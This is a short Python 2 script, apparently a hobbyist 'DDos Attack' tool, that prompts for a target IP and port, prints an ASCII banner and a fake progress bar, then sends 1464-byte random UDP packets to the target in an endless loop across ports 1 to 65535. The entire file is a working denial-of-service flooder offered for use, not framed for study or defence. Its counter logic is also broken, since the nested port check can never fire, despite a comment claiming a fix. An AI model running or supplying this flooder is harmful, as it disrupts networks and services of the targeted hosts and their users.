import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1464)
#############

os.system("clear")
os.system("figlet DDos Attack")
print " ____  _____                     _   _   _             _ "
print "|  _ \|  _  \  ___  ___         / \ | |_| |_ __ _  ___| | __ "
print "| | | | | |  |/ _ \/ __|       / _ \| __| __/ _` |/ __| |/ /"
print "| |_| | |_|  | (_) \__ \      / ___ \ |_| || (_| | (__|   <"
print "|____/|_____/ \___/|___/     /_/   \_\__|\__\__,_|\___|_|\_\ "
print ""


print
ip = raw_input("IP : ")
port = input("port : ")

os.system("clear")
os.system("ping www.a1475.com")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(3)
sent = 0
frequency = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     if port == 65535:
       port = 1
       if port == 65535:
           frequency = frequency + 1

       print" Send %s to %s  of Through port 1-65535 frequency %s"%(sent,ip,frequency)

#fixed a bug to if port == 65535